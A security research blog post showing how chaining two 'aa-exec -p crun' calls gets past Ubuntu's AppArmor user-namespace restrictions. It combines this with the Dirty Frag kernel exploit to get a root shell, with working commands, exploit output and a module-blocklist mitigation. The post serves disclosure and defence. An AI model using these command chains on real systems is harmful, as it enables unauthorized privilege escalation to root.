---
date: '2026-05-13T00:00:00Z'
title: "Hello, my name is NOT unconfined: Two Hops and a Shell on Ubuntu"
summary: "Ubuntu's userns restriction patch checks a pointer, not a property. After one profile hop, the label is still functionally unconfined but it's not the sentinel the patch is looking for. Two aa-exec calls, chained into host root via dirtyfrag. Exploring SiCk's two-hop AppArmor bypass."
tags: ["bypass-pwn", "AppArmor", "Ubuntu", "Dirty Frag", "CVE-2026-43284", "CVE-2026-43500", "Purple Team", "Kernel Security", "Exploit", "User Namespaces"]
categories: ["Security Research"]
---

{{< imgmodal src="/img/security/hello-my-name-is-not-unconfined.png" alt="A name tag sticker with the name NOT unconfined" mode="shrink" caption="Ubuntu's AppArmor only checks the name tag." >}}

Ubuntu's AppArmor restrictions on unprivileged user namespaces are controlled by two sysctls:

- `kernel.apparmor_restrict_unprivileged_userns` prevents unconfined processes from creating capable namespaces
- `kernel.apparmor_restrict_unprivileged_unconfined` prevents those processes from hopping into permissive profiles to get around the first.

The second check identifies you as unconfined by comparing your label against a single kernel pointer - the global-unconfined sentinel. Hop into any named profile and your label is a different pointer. You're still functionally unconfined, but your name tag says otherwise, and that's all the kernel checks.

## Background

I landed on [SiCk's bypass-pwn post](https://afflicted.sh/blog/posts/bypass-pwn.html) by chance a few days ago, which demonstrates a two-hop profile transition that defeats Ubuntu's AppArmor-based restrictions on unprivileged user namespaces from an unprivileged user, with both sysctls enabled, on stock Ubuntu 26.04 LTS. The write-up is thorough and the analysis is clean. The PoC is a compiled C binary using `change_onexec()`.

The `Dirty Frag` vulnerability was disclosed this week. While [porting the exploit to arm64](/posts/porting-dirtyfrag-arm64) to test my servers I found only the xfrm/ESP CVE-2026-43284 path was viable in my test environment. That path requires `CAP_NET_ADMIN`, and the unprivileged route to that capability is a user+network namespace. I wanted to see if `aa-exec`, which was present by default on every standard Ubuntu cloud and installer image I tested, works to bypass the current Ubuntu restrictions.

It does.

It bypasses one of the strongest mitigations on Ubuntu for `Dirty Frag` recommended in most current advice. The `kernel.apparmor_restrict_unprivileged_unconfined` concept is good, but the current implementation has a simple two-hop bypass.

Regardless of configuration, an unprivileged user can obtain full capabilities in a user namespace on an Ubuntu system with the default crun AppArmor profile loaded:

| Configuration | Direct | Single `aa-exec` | Double `aa-exec` |
|---|---|---|---|
| Both sysctls off | ✓ | ✓ | ✓ |
| `restrict_unprivileged_userns=1`, `restrict_unprivileged_unconfined=0` |  | ✓ | ✓ |
| `restrict_unprivileged_userns=1`, `restrict_unprivileged_unconfined=1` |  |   | ✓ |

## Impact

With `DirtyFrag` being released this week, this has a real impact.

On my test Ubuntu 24.04 system `6.17.0-1013-aws #13~24.04.1-Ubuntu`, applying both of the apparmor sysctl settings:

```bash
$ sudo sysctl -w kernel.apparmor_restrict_unprivileged_unconfined=1
$ sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1
```

Then attempting the dirtyfrag exploit, it fails being run in my initial shell, then it fails under a single aa-exec, before ultimately working by chaining aa-exec:

```bash
k@devbox:~$ env DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag_arm64 --force-esp
[su] uid_map: Operation not permitted
[su] corruption stage failed (status=0x100)
dirtyfrag: failed (rc=1)

k@devbox:~$ aa-exec -p crun -- env DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag_arm64 --force-esp
[su] uid_map: Operation not permitted
[su] corruption stage failed (status=0x100)
dirtyfrag: failed (rc=1)

k@devbox:~$ aa-exec -p crun -- aa-exec -p crun -- env DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag_arm64 --force-esp
[su] installed 53 xfrm SAs
[su] wrote 212 bytes to /usr/bin/su starting at 0x0
[su] /usr/bin/su page-cache patched (entry 0x78 = shellcode)

k@devbox:~$ /usr/bin/su
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /proc/self/uid_map
         0          0 4294967295

# readlink /proc/self/ns/user
user:[4026531837]

# readlink /proc/1/ns/user
user:[4026531837]
```

The matching user:[4026531837] values show that the root shell is in the same user namespace as PID 1, not a temporary user namespace created by unshare.

Just `aa-exec` chained with itself using the same `crun` profile loaded on every recent standard Ubuntu image I tested. Minimal images may not include the userland helper, but SiCk's PoC reaches the same profile-transition path directly. `aa-exec` is not SUID and doesn't rely on special privileges.

The single-hop attempt fails at `uid_map`. The two-hop attempt works and dirtyfrag writes `/usr/bin/su` via the ESP page-cache primitive, producing real init-namespace root.

The namespace capability is not host root by itself. The issue is when a kernel vulnerability requires increased capabilities to trigger, this provides a path for an unprivileged user.

## Details

Same environment with both apparmor sysctl settings set to the more restrictive setting, this is what is prevented and allowed at each step and what the AppArmor profile looks like at each step.

First a normal ssh shell:

```bash
k@devbox:~$ sysctl kernel.apparmor_restrict_unprivileged_userns
kernel.apparmor_restrict_unprivileged_userns = 1

k@devbox:~$ sysctl kernel.apparmor_restrict_unprivileged_unconfined
kernel.apparmor_restrict_unprivileged_unconfined = 1

k@devbox:~$ cat /proc/self/attr/current
unconfined

k@devbox:~$ unshare -U -r -n id 2>&1
unshare: write failed /proc/self/uid_map: Operation not permitted
```

Then with a single aa-exec:

```bash
k@devbox:~$ aa-exec -p crun -- cat /proc/self/attr/current
crun//&unconfined (complain)

k@devbox:~$ aa-exec -p crun -- unshare -U -r -n id 2>&1
unshare: write failed /proc/self/uid_map: Operation not permitted
```

Then, two aa-exec:

```bash
k@devbox:~$ aa-exec -p crun -- aa-exec -p crun -- cat /proc/self/attr/current
crun (complain)

k@devbox:~$ aa-exec -p crun -- aa-exec -p crun -- unshare -U -r -n id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

k@devbox:~$ aa-exec -p crun -- aa-exec -p crun -- unshare -U -r -n -- cat /proc/self/status | grep Cap
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

Now we have the capabilities needed for dirtyfrag to call the ESP functions and trigger the vulnerability.

The label transitions from the tests above show exactly where the patch fires and where it doesn't:

| Step | Label | Result |
|------|-------|--------|
| Normal shell | `unconfined` | Blocked - this is the global sentinel pointer |
| Single `aa-exec -p crun` | `crun//&unconfined (complain)` | Blocked - patch fired, forced stacking |
| Double `aa-exec -p crun` | `crun (complain)` | **Allowed** - different pointer, patch skipped |

## Why this works

SiCk's post has a complete kernel-side analysis and the label transitions visible in the demo output. He wrote an elegant self re-executing binary that uses `change_onexec` to move between profiles demonstrating exactly what is going on without relying on system tools.

In this post I am using the built-in `aa-exec` for simplicity which uses `change_profile`, both go through the same kernel check.

The patch compares your current label pointer against the global-unconfined singleton. When chaining through `aa-exec` twice, the stacked label `crun//&unconfined` is a different struct `aa_label *` at a different address, so the second transition skips the stacking branch. The patch asks "are you the global-unconfined pointer?" when it should ask "did you descend from it?"

## What this means for mitigation guidance

Every CVE writeup and hardening guide that ends with "but `kernel.apparmor_restrict_unprivileged_unconfined=1` mitigates this on Ubuntu" is citing a gate that is open on every current Ubuntu LTS image I tested, and at minimum should not be treated as a reliable standalone mitigation. The sysctl catches the first hop and misses the second, and the second hop requires nothing more than `aa-exec` or the same kernel interface used by SiCk's standalone PoC.

For the `Dirty Frag` vulnerability specifically, the effective mitigation is module blocklisting:

```
# /etc/modprobe.d/dirty-frag.conf
install esp4        /bin/false
install esp6        /bin/false
install rxrpc       /bin/false
```

This prevents the vulnerable kernel code from loading at all, regardless of namespace reach. Ubuntu also recommends regenerating initramfs so the blocklist is present during early boot, then unloading any already-loaded modules and verifying they are absent from /proc/modules. I still want to test the exact early-boot load paths separately.

For the broader class of `ns_capable()` kernel bugs that need capabilities inside a user namespace: on Ubuntu, assume unprivileged users have that reach. I have gone into hardening against the class as a whole in other posts.

## Credits

- **SiCk** ([afflicted.sh](https://afflicted.sh/)) - bypass-pwn: the two-hop analysis, the kernel code walkthrough, the PoC, putting out top-tier research
- **V4bel** ([github.com/V4bel](https://github.com/V4bel)) - DirtyFrag: the research and discovery of CVE-2026-43284 and the PoC referenced throughout this post
